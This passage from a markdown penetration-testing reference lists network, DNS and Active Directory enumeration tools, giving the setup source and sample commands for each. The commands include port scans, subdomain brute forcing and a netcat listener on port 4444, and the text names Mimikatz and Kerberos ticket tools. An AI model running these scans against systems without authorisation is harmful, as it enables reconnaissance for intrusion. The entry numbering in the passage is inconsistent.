**Purpose**: Network connectivity testing, port scanning, and data transfer
**Setup**: Download from https://eternallybored.org/misc/netcat/
**Usage**: `nc -zv target 80 443 3389`, `nc -l -p 4444`
**Reference**: [02_Network_Enumeration.md](./02_Network_Enumeration.md)

#### **35. 🌐 Ncat - The Enhanced Netcat**
**Purpose**: Enhanced version of netcat with additional features
**Setup**: Part of Nmap package, or download separately
**Usage**: `ncat -zv target 80 443 3389`, `ncat -l -p 4444 --ssl`
**Reference**: [02_Network_Enumeration.md](./02_Network_Enumeration.md)

#### **36. 🔍 Angry IP Scanner - The GUI Network Scanner**
**Purpose**: User-friendly network scanning with GUI interface
**Setup**: Download from https://angryip.org/download/
**Usage**: GUI-based network discovery and port scanning
**Reference**: [02_Network_Enumeration.md](./02_Network_Enumeration.md)

#### **37. 🎯 Advanced IP Scanner - The Professional Network Scanner**
**Purpose**: Professional network discovery with detailed reporting
**Setup**: Download from https://www.advanced-ip-scanner.com/
**Usage**: Comprehensive network scanning with device identification
**Reference**: [02_Network_Enumeration.md](./02_Network_Enumeration.md)

#### **38. 🕸️ SpiderFoot - The OSINT Network Reconnaissance**
**Purpose**: Open-source intelligence gathering for network reconnaissance
**Setup**: `pip install spiderfoot` or download from GitHub
**Usage**: `spiderfoot -l 127.0.0.1:5001 -s target.com`
**Reference**: [02_Network_Enumeration.md](./02_Network_Enumeration.md)

#### **39. 🔍 DNSEnum - The DNS Enumeration Specialist** ^dnsenum
**Purpose**: Comprehensive DNS enumeration and subdomain discovery
**Setup**: Download from https://github.com/fwaeytens/dnsenum or use package manager
**Usage**: `dnsenum target.com`, `dnsenum --dnsserver 8.8.8.8 target.com`
**Reference**: [03_DNS_Enumeration.md](./03_DNS_Enumeration.md)

#### **40. 🕵️ DNSRecon - The DNS Reconnaissance Toolkit** ^dnsrecon
**Purpose**: Advanced DNS reconnaissance with zone transfer attempts
**Setup**: `pip install dnsrecon` or download from GitHub
**Usage**: `dnsrecon -d target.com`, `dnsrecon -d target.com -n 8.8.8.8`
**Reference**: [03_DNS_Enumeration.md](./03_DNS_Enumeration.md)

#### **41. 🦁 Fierce - The DNS Brute Force Tool** ^fierce
**Purpose**: DNS brute forcing and subdomain enumeration
**Setup**: `pip install fierce` or download from GitHub
**Usage**: `fierce --domain target.com`, `fierce --domain target.com --subdomain-file wordlist.txt`
**Reference**: [03_DNS_Enumeration.md](./03_DNS_Enumeration.md)

#### **42. 📋 Sublist3r - The Subdomain Enumeration Tool** ^sublist3r
**Purpose**: Subdomain enumeration via search engines and DNS
**Setup**: `pip install sublist3r` or download from GitHub
**Usage**: `sublist3r -d target.com`, `sublist3r -d target.com -b`
**Reference**: [03_DNS_Enumeration.md](./03_DNS_Enumeration.md)

#### **43. 🎯 Gobuster - The Directory and DNS Brute Forcer** ^gobuster
**Purpose**: DNS subdomain brute forcing and directory enumeration
**Setup**: Download from https://github.com/OJ/gobuster/releases
**Usage**: `gobuster dns -d target.com -w wordlist.txt`, `gobuster dir -u http://target.com -w wordlist.txt`
**Reference**: [03_DNS_Enumeration.md](./03_DNS_Enumeration.md)

#### **44. 🔐 Amass - The In-Depth Attack Surface Mapping** ^amass
**Purpose**: Comprehensive attack surface mapping and subdomain enumeration
**Setup**: Download from https://github.com/OWASP/Amass/releases
**Usage**: `amass enum -d target.com`, `amass enum -d target.com -active`
**Reference**: [03_DNS_Enumeration.md](./03_DNS_Enumeration.md)

#### **45. 🎭 Ticketer - The Kerberos Ticket Manipulator**
**Purpose**: Kerberos ticket manipulator
**Setup**: Download Ticketer executable
**Usage**: Kerberos ticket manipulation
**Reference**: *Coming Soon*

---

### **🪟 NATIVE WINDOWS TOOLS**

#### **33. 🏷️ Service Principal Name Tools**
**Purpose**: Native SPN management and enumeration
**Tools**: `setspn.exe`, `klist.exe`, `ksetup.exe`
**Usage**: Native SPN operations
**Reference**: *Coming Soon*

#### **34. 🔍 Active Directory PowerShell Cmdlets**
**Purpose**: Microsoft-signed AD enumeration
**Tools**: `Get-AD*` cmdlets
**Usage**: `Import-Module ActiveDirectory`
**Reference**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md), *Coming Soon*

#### **35. 🧩 Additional Native Tools**
**Purpose**: Built-in Windows utilities for AD enumeration
**Tools**: `dsquery`, `ldifde`, `reg.exe`, `sqlcmd.exe`, `gpresult.exe`, `quser.exe`, `net.exe`
**Usage**: Native Windows commands
**Reference**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md), *Coming Soon*

---

## 🔗 **COMPREHENSIVE CROSS-REFERENCES**

### **📋 TECHNIQUE REFERENCES**
- **Network Enumeration**: [02_Network_Enumeration.md](./02_Network_Enumeration.md) - Uses tools from this arsenal
- **Domain Enumeration**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md) - PowerView and native tools
- **User Enumeration**: *Coming Soon* - PowerView functions
- **Kerberos Attacks**: *Coming Soon* - Mimikatz and Rubeus
- **BloodHound Analysis**: *Coming Soon* - SharpHound collection

### **🛠️ TOOL-SPECIFIC REFERENCES**
- **PowerView Usage**: [04_Domain_Enumeration.md](./04_Domain_Enumeration.md), *Coming Soon*
- **BloodHound Workflows**: *Coming Soon*
- **Mimikatz Techniques**: *Coming Soon*, *Coming Soon*
- **Stealth Techniques**: *Coming Soon*, *Coming Soon*

---

## 🎯 **NAVIGATION & NEXT STEPS**

**🔄 [Back to Master Index](./00_Enumeration_Index.md)** | **🌐 [Next: Network Enumeration](./02_Network_Enumeration.md)** | **🔐 Kerberos Master Index** - *Coming Soon*

---

**🎯 This tool arsenal provides everything you need for AD enumeration. Each tool includes complete setup, usage examples, and integration workflows. Start with the core tools and build your arsenal based on your environment and objectives.**
